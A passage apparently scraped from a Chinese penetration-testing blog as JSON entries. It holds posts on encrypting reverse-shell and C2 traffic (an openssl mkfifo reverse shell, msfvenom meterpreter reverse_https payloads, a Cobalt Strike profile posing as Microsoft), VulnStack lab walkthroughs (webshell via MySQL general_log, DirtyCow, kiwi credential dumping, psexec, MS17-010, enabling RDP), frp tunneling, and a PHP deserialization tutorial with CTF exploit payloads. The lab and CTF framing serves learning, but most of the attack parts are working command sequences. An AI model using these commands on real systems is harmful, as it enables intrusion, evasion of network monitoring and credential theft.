[{"content":"Openssl反弹shell 既然是openssl反弹的shell，那么流量自然是加密的。\n攻击机：\n//生成自签名证书 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes //监听本地端口 openssl s_server -quiet -key key.pem -cert cert.pem -port 8989 被攻击机：\n//反弹shell mkfifo /tmp/s; /bin/sh -i \u0026lt; /tmp/s 2\u0026gt;\u0026amp;1 | openssl s_client -quiet -connect 10.0.0.116:8989 \u0026gt; /tmp/s;rm /tmp/s msf流量加密 首先openssl生成证书，msfvenom生成木马的时候使用该证书。其次攻击机本地设置监听的时候要带上刚刚生成的证书文件。\n攻击机：\n生成木马\n//openssl生成证书 openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj \u0026#34;/C=UK/ST=London/L=London/O=Development/CN=www.google.com\u0026#34; -keyout www.google.com.key -out www.google.com.crt \u0026amp;\u0026amp; cat www.google.com.key www.google.com.crt \u0026gt; www.google.com.pem \u0026amp;\u0026amp; rm -f www.google.com.key www.google.com.crt //msfvenom使用证书生成木马 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.116 LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=www.google.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -a x64 --platform windows -o pentestlab.bat 配置加密监听\nuse exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set LHOST 10.0.0.116 set LPORT 443 set HandlerSSLCert /home/kali/hongri/openssltest/www.google.com.pem set StagerVerifySSLCert true exploit 被攻击机：\n直接运行木马即可 show advanced 查看高级配置\nCS加密混淆 Cobalt Strike修改C2 profile\n攻击机：\n//生成证书并记住密码和填的字段 //frasec和frasec.store以及密码等都要要填写到profile文件里面 keytool -genkey -alias frasec -keyalg RSA -validity 36500 -keystore frasec.store 新建frasec.profile配置文件，主要修改内容：\nhttps-certificate { set CN \u0026#34;Microsoft\u0026#34;; #Common Name set O \u0026#34;MicrosoftUpdates\u0026#34;; #Organization Name set C \u0026#34;en\u0026#34;; #Country set L \u0026#34;US\u0026#34;; #Locality set OU \u0026#34;MicrosoftUpdates\u0026#34;; #Organizational Unit Name set ST \u0026#34;US\u0026#34;; #State or Province set validity \u0026#34;36500\u0026#34;; #Number of days the cert is valid for } code-signer{ set keystore \u0026#34;frasec.store\u0026#34;; set password \u0026#34;123456\u0026#34;; set alias \u0026#34;frasec\u0026#34;; } 其它内容可做适当更改\n启动服务端\nsudo ./teamserver 10.0.0.116 pass14 frasec.profile 客户端连接后生成https的木马即可，加密流量如下：\nhttps://github.com/rsmudge/Malleable-C2-Profiles\n","date":"2023-11-02T10:02:40+08:00","image":"https://fragrant1001.github.io/post/2023/encryptedflow/beacon_hu3d03a01dcc18bc5be0e67db3d8d209a6_6071910_120x120_fill_q75_box_smart1.jpg","permalink":"https://fragrant1001.github.io/post/2023/encryptedflow/","title":"流量传输加密混淆"},{"content":"10.0.0.119和192.168.93.100是同一台机器，同时100的80、3360端口都会转发到192.168.93.120机器。\n120-Web服务器 快速端口扫描: nmap -Pn -p- -sS 10.0.0.119\n固定端口扫版本以及用脚本扫: nmap -Pn -p22,80,3306 -sC -sV 10.0.0.119\nPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.3 (protocol 2.0) | ssh-hostkey: | 1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA) |_ 2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA) 80/tcp open http nginx 1.9.4 |_http-server-header: nginx/1.9.4 |_http-generator: Joomla! - Open Source Content Management |_http-title: Home | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ 3306/tcp open mysql MySQL 5.7.27-0ubuntu0.16.04.1 | mysql-info: | Protocol: 10 | Version: 5.7.27-0ubuntu0.16.04.1 | Thread ID: 317 | Capabilities flags: 63487 | Some Capabilities: ODBCClient, SupportsTransactions, FoundRows, LongColumnFlag, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, LongPassword, Support41Auth, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, SupportsLoadDataLocal, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults | Status: Autocommit | Salt: \\x07~ULB{,mL\\x01O\\x19u\\x12\\x1C\\x10\\x03\\x0Ddj |_ Auth Plugin Name: mysql_native_password MAC Address: 94:E2:3C:A5:00:23 (Intel Corporate) joomscan和dirsearch的到phpinfo文件1.php、后台目录和备份配置文件configuration.php~，得到数据库连接凭证和路径等敏感信息\npublic $user = \u0026#39;testuser\u0026#39;; public $password = \u0026#39;cvcvgjASD!@\u0026#39;; public $db = \u0026#39;joomla\u0026#39;; public $dbprefix = \u0026#39;am2zu_\u0026#39;; public $live_site = \u0026#39;\u0026#39;; public $secret = \u0026#39;gXN9Wbpk7ef3A4Ys\u0026#39;; 登陆mysql并修改后台管理员密码\nupdate am2zu_users set password=md5(\u0026#34;1234567\u0026#34;) where username=\u0026#39;administrator\u0026#39;; joomla后台新增模版文件getshell 蚁剑连接一句话木马之后发现不能执行命令，突破disable_fucntion\nhttp://10.0.0.119/bypass_disablefunc.php?cmd=ifconfig\u0026amp;outpath=/tmp/xx\u0026amp;sopath=/var/www/html/bypass_disablefunc_x64.so 没有主机ip说明做了反向代理，可能是nginx\n初步收集一下信息，上传fscan扫一下c段\n192.168.93.120:3306 open 192.168.93.100:3306 open 192.168.93.20:1433 open 192.168.93.120:80 open 192.168.93.100:80 open 192.168.93.20:80 open 192.168.93.120:22 open 192.168.93.100:22 open [*]192.168.93.30 [-\u0026gt;]win7 [-\u0026gt;]192.168.93.30 [*]192.168.93.20 [-\u0026gt;]win2008 [-\u0026gt;]192.168.93.20 [*]192.168.93.10 [-\u0026gt;]WIN-8GA56TNV3MV [-\u0026gt;]192.168.93.10 [*] NetBios: 192.168.93.10 [+]DC WIN-8GA56TNV3MV.test.org Windows Server 2012 R2 Datacenter 9600 [*] 192.168.93.10 (Windows Server 2012 R2 Datacenter 9600) [*] NetBios: 192.168.93.20 win2008.test.org Windows Server (R) 2008 Datacenter 6003 Service Pack 2 [*] 192.168.93.30 (Windows 7 Professional 7601 Service Pack 1) [*] 192.168.93.20 (Windows Server (R) 2008 Datacenter 6003 Service Pack 2) [+] mysql:192.168.93.120:3306:root 123 [+] mysql:192.168.93.100:3306:root 123 得到10、20、30都是windows且10是域控，其次是100就是有代理软件的机器，实际上web是在120上。也可以用netstat -naplt看当前机器在跟哪台机器在通信。 100出口服务器 在/tmp/mysql/test.txt发现认证信息，可直接登录119机器。ssh wwwuser@10.0.0.119 -oHostKeyAlgorithms=+ssh-dss一定要带上后面的参数。\nadduser wwwuser passwd wwwuser_123Aqx 脏牛dirtycow提权\n[wwwuser@anonymous ~]$ gcc -pthread dirty.c -o dirty -lcrypt [wwwuser@anonymous ~]$ rm -rf /tmp/passwd.bak [wwwuser@anonymous ~]$ gcc -pthread dirty.c -o dirty -lcrypt [wwwuser@anonymous ~]$ ./dirty …… [wwwuser@anonymous ~]$ su firefart [wwwuser@anonymous ~]$ id 20windows 上传frpc做代理 上传Responder抓hash值 连接20的1433(密码和mysql的一样)访问100的smb服务EXEC master.sys.xp_dirtree \u0026quot;\\\\192.168.93.100\\ttttanything\u0026quot;,0,1 jhon对hash暴破得到密码123qwe!ASD\nmsf的psexec模块上线20机器\nmsf6 \u0026gt; use exploit/windows/smb/psexec msf6 exploit(windows/smb/psexec) \u0026gt; set RHOSTS 192.168.93.20 msf6 exploit(windows/smb/psexec) \u0026gt; setg proxies socks5:127.0.0.1:6000 msf6 exploit(windows/smb/psexec) \u0026gt; set SMBUser administrator msf6 exploit(windows/smb/psexec) \u0026gt; set SMBPass 123qwe!ASD msf6 exploit(windows/smb/psexec) \u0026gt; set payload windows/x64/meterpreter/bind_tcp 确定域控的ip: ipconfig /all发现DNS服务器再ping一下即可\n10域控 20msf上线后通过加载kiwi抓认证密码\nload kiwi creds_kerberos Administrator TEST.ORG zxcASDqw123!! Administrator WIN2008 123qwe!ASD msf上线不了10机器，改用impacket-wmiexec执行命令\nproxychains -q impacket-wmiexec test.org/administrator@192.168.93.10 30windows impacket-wmiexec上线，密码123qwe!ASD。注意不要加域\nmsf上线，也是不要加域\nmsf6 exploit(windows/smb/psexec) \u0026gt; set RHOSTS 192.168.93.30 msf6 exploit(windows/smb/psexec) \u0026gt; set SMBDomain . msf6 exploit(windows/smb/psexec) \u0026gt; set SMBPass 123qwe!ASD msf6 exploit(windows/smb/psexec) \u0026gt; exploit ","date":"2023-10-28T15:52:39+08:00","image":"https://fragrant1001.github.io/post/2023/vulnstack03/vulnstack03_hu3d03a01dcc18bc5be0e67db3d8d209a6_1019912_120x120_fill_q75_box_smart1.jpg","permalink":"https://fragrant1001.github.io/post/2023/vulnstack03/","title":"VulnStack内网靶场（三）"},{"content":"通过web端拿shell phpMyadmin弱口令进去，开启general_log和配置general_log_file值,写入一句话木马.\nSHOW VARIABLES LIKE \u0026#34;general_log%\u0026#34;; set global general_log = \u0026#34;ON\u0026#34;; set global general_log_file = \u0026#34;C:/phpStudy/WWW/a1.php\u0026#34;; select \u0026#39;\u0026lt;?php @eval($_POST[1]);?\u0026gt;\u0026#39;; hackbar测试 ColbaltStrike速通 建立Listeners-创建Scripted Web Delivery给到webshell去执行和返回session(失败了)\n上传可执行木马并执行返回session net view看内网其它机器\n新建一个Listeners横向移动拿其它内网主机session(因为当前域控管理员账户，所以可以直接横向移动)\n看见建立连接即表示成功 [+] established link to child beacon:\nMetasploit折腾 启动-使用payload生成用于反弹shell的木马\nsudo msfdb run use payload/windows/x64/meterpreter/reverse_tcp options set LHOST 10.0.0.18 set LHOST 5555 generate -f exe -o win_5555.exe 方便一点的就直接用msfvenom直接生成\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.18 LPORT=5556 -f exe -o win_5556.exe\n监听本地端口\nuse exploit/multi/handler set LHOST 10.0.0.18 set LPORT 5555 set payload windows/x64/meterpreter/reverse_tcp exploit 上传木马反弹会话\n加载kiwi模块抓密码\nload kiwi getsystem creds_kerberos 进Windows shell收集域信息\nshell chcp 65001 net view //域其它主机名称 \\\\OWA \\\\ROOT-TVI862UBEH net time /domain //域信息owa.god.org net user //用户信息 net user /domian net config workstation 直接ping拿ip地址\n上传fscan扫描看看\n.\\fscan64.exe -h 192.168.52.0/24\nfrp挂代理横向移动，c端上传到被攻击机器上，s端上传到vps上\nfrpc\nserverAddr = \u0026#34;10.0.0.18\u0026#34; serverPort = 7000 [[proxies]] name = \u0026#34;any\u0026#34; type = \u0026#34;tcp\u0026#34; remotePort = 6002 [proxies.plugin] type = \u0026#34;socks5\u0026#34; frps\nbindAddr = \u0026#34;0.0.0.0\u0026#34; bindPort = 7000 设置msf路由和代理\nmeterpreter \u0026gt; run post/multi/manage/autoroute meterpreter \u0026gt; bg ……………… msf6 \u0026gt; setg Proxies socks5://127.0.0.1:6002 msf6 \u0026gt; setg ReverseAllowProxy true 138机器永恒之蓝漏洞利用\nuse auxiliary/admin/smb/ms17_010_command set RHOSTS 192.168.52.138 set command \u0026#34;net user\u0026#34; exploit 141机器可开启3389\nset RHOSTS 192.168.52.141 set command \u0026#39;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\u0026#39; 关闭2003的3389 set command 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026quot; \u0026quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f'\nproxychains代理连接3389\nproxychains rdesktop 192.168.52.141 -p hongrisec@2023 -u administrator ","date":"2023-10-18T17:12:23+08:00","image":"https://fragrant1001.github.io/post/2023/vulnstack01/cover_hu3d03a01dcc18bc5be0e67db3d8d209a6_645660_120x120_fill_q75_box_smart1.jpg","permalink":"https://fragrant1001.github.io/post/2023/vulnstack01/","title":"VulnStack内网靶场（一）"},{"content":" 文章的部分内容被密码保护：\n--- DON'T MODIFY THIS LINE --- 官方文档：\nhttps://www.bookstack.cn/read/frp/README_zh.md https://github.com/fatedier/frp 服务端(ubuntu 20.04 64位)，安装frps wget https://github.com/fatedier/frp/releases/download/v0.37.1/frp_0.37.1_linux_amd64.tar.gz tar -zxvf frp_0.37.1_linux_amd64.tar.gz 服务端配置 frps.ini [common] bind_port = 7000 bind_udp_port = 7001 token = xxxxxxxx 受控端(ubuntu 20.04 64位)安装frpc wget https://github.com/fatedier/frp/releases/download/v0.37.1/frp_0.37.1_linux_amd64.tar.gz tar -zxvf frp_0.37.1_linux_amd64.tar.gz 受控端配置 frpc.ini [common] server_addr = 1.1.1.1 server_port = 7000 token = xxxxxxxx # visitor xtcp mod for xxxx [ssh_x_xxxx] type = xtcp sk = axxxaxxxaxxa use_encryption = true use_compression = true local_ip = 192.168.1.112 local_port = 22 # visitor stcp mod for xxxx [ssh_s_xxxx] type = stcp sk = axxxaxxxaxxa use_encryption = true use_compression = true local_ip = 192.168.1.112 local_port = 22 控制端(m1 air)安装frpc brew info frpc # 安装前查看版本是否一致 brew install frpc 控端端配置 frpc.ini [common] server_addr = 1.1.1.1 server_port = 7000 token = xxxxxxxx [ssh_xxxx_visitor] type = xtcp role = visitor use_encryption = true use_compression = true server_name = nm_x_xxxx sk = axxxaxxxaxxa bind_addr = 127.0.0.1 bind_port = 44444 还需要配置一下服务化和开机自启，不再赘述。\n","date":"2021-08-20T11:20:59+08:00","image":"https://fragrant1001.github.io/post/2023/frpp2p/FRPcover_huab543289394a9616cfd267efcd68b4ed_4136735_120x120_fill_q75_box_smart1.jpg","permalink":"https://fragrant1001.github.io/post/2023/frpp2p/","title":"Frsssp点对点内网穿透"},{"content":"php反序列化深度学习\n序列化与反序列化 序列化 serialize — 产生一个可存储的值的表示\nserialize() 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。\n这有利于存储或传递 PHP 的值，同时不丢失其类型和结构。\n想要将已序列化的字符串变回 PHP 的值，可使用 unserialize()。serialize() 可处理除了 resource 之外的任何类型。甚至可以 serialize() 那些包含了指向其自身引用的数组。你正 serialize() 的数组／对象中的引用也将被存储。\n当序列化对象时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。\n我们先看几个例子：\n普通字符串变量序列化\n\u0026lt;?php $test = \u0026#39;123456\u0026#39;; $result = serialize($test); echo $result; ?\u0026gt; 数组变量序列化\n\u0026lt;?php $arr = [ \u0026#34;foo\u0026#34; =\u0026gt; \u0026#34;bar\u0026#34;, \u0026#34;bar\u0026#34; =\u0026gt; \u0026#34;foo\u0026#34;, ]; $result = serialize($arr); print_r($result); 对象变量序列化\n\u0026lt;?php class test{ public $name = \u0026#34;zhangsan\u0026#34;; public $age = 10; } $obj = new test(); $result = serialize($obj); print_r($result); 可见几乎所有正确的变量都可以被序列化成字符串然后保存下来\n序列化一个对象后将会保存对象的所有变量，并且发现序列化后的结果都有一个字符，这些字符都是以下字母的缩写。\na - array b - boolean d - double i - integer o - common object r - reference s - string C - custom object O - class N - null R - pointer reference U - unicode string 不同权限的属性序列化情况(public、protected、private)\n\u0026lt;?php class test{ public $name = \u0026#34;zhangsan\u0026#34;; protected $age = 10; private $sex = \u0026#34;man\u0026#34;; } $obj = new test(); $result = serialize($obj); print_r($result); 这里介绍一下public、private、protected的区别(区别常见于字符串逃逸类型题目)\npublic(公共的):在本类内部、外部类、子类都可以访问\nprotect(受保护的):只有本类或子类或父类中可以访问\nprivate(私人的):只有本类内部可以使用\nprotect分析：\n本来是age结果上面出现的是*age，而且*age的长度是4，但是上面显示的是6，查找资料后发现protect属性序列化的时候格式是%00*%00成员名\nprivate分析：\n这样就发现本来是sex结果上面出现的是testsex，而且testsex长度为7，但是上面显示的是9，同样查找资料后发现private属性序列化的时候格式是%00类名%00成员名，%00占一个字节长度，所以sex加了类名后变成了testsex长度为9\n反序列化 unserialize — 从已存储的表示中创建 PHP 的值\nunserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。 序列化后的字符串。\n若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在的话）。\n我们再看几个例子：\n\u0026lt;?php $b = \u0026#39;s:6:\u0026#34;123456\u0026#34;;\u0026#39;; $b1 = unserialize($b); print_r($b1); ?\u0026gt; \u0026lt;?php $b = \u0026#39;a:2:{s:3:\u0026#34;foo\u0026#34;;s:3:\u0026#34;bar\u0026#34;;s:3:\u0026#34;bar\u0026#34;;s:3:\u0026#34;foo\u0026#34;;}\u0026#39;; $b1 = unserialize($b); print_r($b1); ?\u0026gt; \u0026lt;?php $b = \u0026#39;O:4:\u0026#34;test\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:8:\u0026#34;zhangsan\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:10;}\u0026#39;; $b1 = unserialize($b); print_r($b1); ?\u0026gt; \u0026lt;?php class test{ public $name = \u0026#34;zhangsan\u0026#34;; public $age = 10; } $b = \u0026#39;O:4:\u0026#34;test\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;s:8:\u0026#34;zhangsan\u0026#34;;s:3:\u0026#34;age\u0026#34;;i:10;}\u0026#39;; $b1 = unserialize($b); print_r($b1); ?\u0026gt; 反序列化漏洞产生原理 因为存在大量的魔术方法、参数的传递、不安全函数的使用导致漏洞的产生\n常见魔术方法\n__construct()当一个对象创建时被调用 __destruct()当一个对象销毁时被调用 __toString()当反序列化后的对象被输出的时候(转化为字符串的时候)被调用 __sleep() 在对象在被序列化之前运行，常用与过滤 __wakeup() 将在反序列化之前立即被调用，常用与初始化 看看这几个魔术方法的执行顺序\n\u0026lt;?php class test{ public $a=\u0026#39;hacked by fra\u0026#39;; public $b=\u0026#39;hacked by fra2\u0026#39;; public function pt(){ echo $this-\u0026gt;a.\u0026#34;\\n\u0026#34;; } public function __construct(){ echo \u0026#34;__construct\\n\u0026#34;; } public function __destruct(){ echo \u0026#34;__destruct\\n\u0026#34;; } public function __sleep(){ echo \u0026#34;__sleep\\n\u0026#34;; return array(\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;); } public function __wakeup(){ echo \u0026#34;__wakeup\\n\u0026#34;; } } //创建对象调用__construct $object = new test(); //序列化对象调用__sleep $serialize = serialize($object); //输出序列化后的字符串 echo \u0026#39;serialize: \u0026#39;.$serialize.\u0026#34;\\n\u0026#34;; //反序列化对象调用__wakeup $unserialize=unserialize($serialize); //调用pt输出数据 $unserialize-\u0026gt;pt(); //脚本结束调用__destruct ?\u0026gt; 看一段存在反序列化漏洞的代码\n\u0026lt;?php class flag{ public $flag = \u0026#34;demon\u0026#34;; function __destruct() { echo $this-\u0026gt;flag; } } $a = $_GET[\u0026#39;v\u0026#39;]; $b = unserialize($a); 利用方法是本地新建一个一样的类，但是更改flag变量的值为\u0026lt;img/src/onerror=alert(1)\u0026gt;,这样再通过序列化的方式输出序列化后的字符串，再将序列化字符串传入v参数，这样即可更改原本的flag值同时输出到页面。\n\u0026lt;?php class flag{ public $flag = \u0026#34;\u0026lt;img/src/onerror=alert(1)\u0026gt;\u0026#34;; function __destruct() { echo $this-\u0026gt;flag; } } $c = new flag(); $d = serialize($c); print_r($d); 这就是php反序列化的入门基础部分，接下来看看简单的序列化题目。\n简单序列化ctf题目案例 \u0026lt;?php error_reporting(0); include(\u0026#39;../flag.php\u0026#39;); $KEY = \u0026#34;TTEESSTT!!\u0026#34;; $str = $_GET[\u0026#39;str\u0026#39;]; if (unserialize($str) === \u0026#34;$KEY\u0026#34;) { echo $flag; } show_source(__FILE__); 大概意思就是变量str反序列化之后的值等于TTEESSTT!!,所以直接将该变量序列化输出就好\n\u0026lt;?php $KEY = \u0026#34;TTEESSTT!!\u0026#34;; print_r(serialize($KEY)); 传入该字符串即可\n某靶场的一道反序列化相关的题目\nindex.php\n\u0026lt;?php $txt = $_GET[\u0026#34;txt\u0026#34;]; $file = $_GET[\u0026#34;file\u0026#34;]; $password = $_GET[\u0026#34;password\u0026#34;]; if(isset($txt) \u0026amp;\u0026amp; (file_get_contents($txt, \u0026#39;r\u0026#39;) === \u0026#34;welcome to the ctf\u0026#34;)){ echo \u0026#39;hello friends!\u0026#39; . \u0026#34;\\n\u0026#34;; if(preg_match(\u0026#34;/flag/\u0026#34;, $file)){ exit(\u0026#34;不能现在就给你flag哦\\n\u0026#34;); }else{ include($file); $password = unserialize($password); echo $password; } } else { echo \u0026#34;you are not the member of us!\\n\u0026lt;br\u0026gt;\u0026#34;; show_source(__FILE__); } ?\u0026gt; \u0026lt;!-- hint.php --\u0026gt; 分析代码可见需要$txt变量赋值并且值需要等于welcome to the ctf,因为函数file_get_contents支持php://input协议，所以可以被绕过。\n然后是$file变量不能够包含flag字符串。\n最后是可包含一个文件，一个反序列化操作，这里的echo熟悉的朋友能看出来这是toString魔法函数的可能性很大。\nhint.php\n\u0026lt;?php class Flag{//flag.php public $file; public function __toString(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\\n success!\u0026#34;; return \u0026#34;good\u0026#34;; } } } show_source(__FILE__); 因为包含了hint.php，所以可以创建以下测试文件输出序列化字符串，再进行反序列化的时候，$file变量会变成flag.php，这样就能直接输出flag的值了。\n\u0026lt;?php class Flag{//flag.php public $file = \u0026#34;flag.php\u0026#34;; public function __toString(){ if(isset($this-\u0026gt;file)){ echo file_get_contents($this-\u0026gt;file); echo \u0026#34;\\n\u0026#34;; return \u0026#34;good\u0026#34;; } } } $a = new Flag(); echo serialize($a); 再看一题\n\u0026lt;?php class foo{ public $file = \u0026#34;2.txt\u0026#34;; public $data = \u0026#34;test\u0026#34;; function __destruct(){ file_put_contents(dirname(__FILE__) . \u0026#39;/\u0026#39; . $this-\u0026gt;file, $this-\u0026gt;data); } } $file_name = $_GET[\u0026#39;filename\u0026#39;]; print \u0026#34;You have readfile \u0026#34; . $file_name; unserialize(file_get_contents($file_name)); 分析代码，$file_name参数可控，存在反序列化情况，只要新建一个对象那么就会在文件里面写指定内容，但是内容和文件名都是可控的。\n\u0026lt;?php class foo{ public $file = \u0026#34;get.php\u0026#34;; public $data = \u0026#34;\u0026lt;?php show_source(\u0026#39;flag.php\u0026#39;);?\u0026gt;\u0026#34;; function __destruct(){ file_put_contents(dirname(__FILE__) . \u0026#39;/\u0026#39; . $this-\u0026gt;file, $this-\u0026gt;data); } } $a = new foo(); echo serialize($a); 不得不说的魔法函数 CVE-2016-7124 __wakeup绕过 __wakeup魔法函数简介\nunserialize()会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup() 方法，预先准备对象需要的资源\n反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup()的执行 (php5 \u0026lt; 5.6.25, php7 \u0026lt; 7.0.10)\n考反序列化的时候经常会遇见\n__wakeup魔法函数绕过例题\nindex.php\n\u0026lt;?php error_reporting(0); class A{ public $target = \u0026#34;test\u0026#34;; function __wakeup(){ $this-\u0026gt;target = \u0026#34;wakeup!\u0026#34;; } function __destruct(){ print_r($this-\u0026gt;target); } } $a = $_GET[\u0026#34;test\u0026#34;]; $b = unserialize($a); if(empty($a)){ show_source(__FILE__); } 因为在反序列化的时候会优先执行__wakeup再执行__destruct，所以导致target属性会一直被覆盖掉，如下：\n\u0026lt;?php error_reporting(0); class A{ public $target = \u0026#34;what I want?\u0026#34;; function __wakeup(){ $this-\u0026gt;target = \u0026#34;wakeup!\u0026#34;; } function __destruct(){ print_r($this-\u0026gt;target); } } $a = new A(); $b = serialize($a); print($b); 但是只需要将O:1:\u0026quot;A\u0026quot;:1:{s:6:\u0026quot;target\u0026quot;;s:12:\u0026quot;what I want?\u0026quot;;}更改成O:1:\u0026quot;A\u0026quot;:3:{s:6:\u0026quot;target\u0026quot;;s:12:\u0026quot;what I want?\u0026quot;;}即可实现__wakeup函数的绕过\n复杂的序列化ctf题目案例 index.php\n\u0026lt;?php error_reporting(0); if (strpos($_GET[\u0026#39;un\u0026#39;], \u0026#39;php://filter\u0026#39;)) { die(\u0026#34;\u0026lt;font color=\u0026#34; . \u0026#34;#9932CC\u0026gt;\u0026#34; . \u0026#39;不允许使用php://filter\u0026#39; . \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;); } class Connection { public $file; public function __construct($file) { $this-\u0026gt;file = $file; } public function __sleep() { $this-\u0026gt;file = \u0026#39;sleep.txt\u0026#39;; return array(\u0026#39;file\u0026#39;); } public function __wakeup() { $this-\u0026gt;file = \u0026#39;wakeup.txt\u0026#39;; } public function __destruct() { include($this-\u0026gt;file); } } if (empty($_GET[\u0026#39;un\u0026#39;])) { ?\u0026gt; \u0026lt;pre\u0026gt; class Connection { public $file; public function __construct($file) { $this-\u0026gt;file = $file; } public function __sleep() { $this-\u0026gt;file = \u0026#39;sleep.txt\u0026#39;; return array(\u0026#39;file\u0026#39;); } public function __wakeup() { $this-\u0026gt;file = \u0026#39;wakeup.txt\u0026#39;; } public function __destruct() { include($this-\u0026gt;file); } } $obj2 = unserialize($_GET[\u0026#39;un\u0026#39;]); \u0026lt;/pre\u0026gt; \u0026lt;?php } $obj2 = unserialize($_GET[\u0026#39;un\u0026#39;]); ?\u0026gt; \u0026lt;!-- flag is in flag.php --\u0026gt; 这个题目要结合文件包含漏洞触发命令执行\n因为存在多个魔法函数，这里就要知道各个魔法函数的执行顺序。在序列化的时候可以直接删除__sleep()以减少影响，其次是利用属性个数大于真实属性个数绕过__wakeup函数，同时因为限制了php://filer因此需要利用php://input来执行代码\n\u0026lt;?php //error_reporting(0); class Connection { public $file; public function __construct($file) { $this-\u0026gt;file = $file; } public function __wakeup() { $this-\u0026gt;file = \u0026#39;wakeup.txt\u0026#39;; } public function __destruct() { include($this-\u0026gt;file); } } // $obj2 = unserialize($_GET[\u0026#39;un\u0026#39;]); $a = new Connection(\u0026#34;php://input\u0026#34;); $b = serialize($a); print_r($b); POST /?un=O:10:\u0026#34;Connection\u0026#34;:2:{s:4:\u0026#34;file\u0026#34;;s:11:\u0026#34;php://input\u0026#34;;} HTTP/1.1 Host: 192.168.122.30:8011 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 Content-Length: 21 \u0026lt;?php system(\u0026#34;ls\u0026#34;);?\u0026gt; 注入对象构造方法 当目标对象被private、protected修饰时的反序列化漏洞 前文说了private和protected返回长度和public不一样的原因，这里再记录一下\nprivate属性序列化的时候格式是%00类名%00属性名 protect属性序列化的时候格式是%00*%00属性名\nprotected情况下\nindex.php\n\u0026lt;?php class A{ protected $test = \u0026#34;abab\u0026#34;; function __destruct() { echo $this-\u0026gt;test; } } $a = $_GET[\u0026#34;test\u0026#34;]; $b = unserialize($a); 利用方式： 先用正常方式输出序列化字符串\n\u0026lt;?php class A{ protected $test = \u0026#34;what i what\u0026#34;; function __destruct() { echo $this-\u0026gt;test; } } $a = new A(); $b = serialize($a); print_r($b); ","date":"2021-05-14T21:36:49+08:00","image":"https://fragrant1001.github.io/post/2023/phpunserialize/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0cover_hueadd436aab634a4d38c4054b2db041b1_370560_120x120_fill_q75_box_smart1.jpg","permalink":"https://fragrant1001.github.io/post/2023/phpunserialize/","title":"Php反序列化原理"},{"content":"剪切板、触摸板手势、ldx安装kali、乱码reset\n内容copy到剪切板或者鼠标滚轮键 安装软件sudo apt install xsel xclip\n将文件内容copy到剪切板 本地 xsel -b \u0026lt; file OR xclip -sel c \u0026lt; file 如果是登录其它linux机器需要在ssh的时候加上-X参数 ssh -X xxx@xx.xx.xx.xx 将命令输出存储到剪切板 echo -n 111 | xsel -b cat /etc/passwd | xclip -sel c 将剪切板中的内容输出到文件 xsel -b -o \u0026gt;\u0026gt; file # -o 貌似可以省略 将文件内容或命令输出copy到鼠标滚轮键和将鼠标滚轮键中的内容输出到文件 将文件内容copy到鼠标滚轮键 xsel \u0026lt; file OR xclip \u0026lt; file 将命令输出copy到鼠标滚轮键 echo -n 111 | xsel cat /etc/passwd | xclip 将鼠标滚轮键中的内容输出到文件 xsel \u0026gt;\u0026gt; file xclip \u0026gt;\u0026gt; file touchpad gestures 安装\nsudo gpasswd -a $USER input newgrp input sudo apt-get install libinput-tools sudo apt-get install ruby sudo gem install fusuma sudo apt-get install xdotool sudo gem install fusuma-plugin-tap fusuma-plugin-keypresss 自定义手势映射\nmkdir -p ~/.config/fusuma # create config directory vim ~/.config/fusuma/config.yml # edit config file. 支持的手势\nswipe: support 3:, 4: fingers support left:, right:, up:, down: directions pinch: support 2:, 3:, 4: fingers support in:, out: directions rotate: support 2:, 3:, 4: fingers support clockwise:,counterclockwise: directions 我的手势vim ~/.config/fusuma/config.yml\nswipe: 3: left: command: \u0026#39;xdotool key ctrl+shift+Tab\u0026#39; right: command: \u0026#39;xdotool key ctrl+Tab\u0026#39; up: command: \u0026#39;xdotool key ctrl+t\u0026#39; keypress: LEFTSHIFT: command: \u0026#39;xdotool key --clearmodifiers 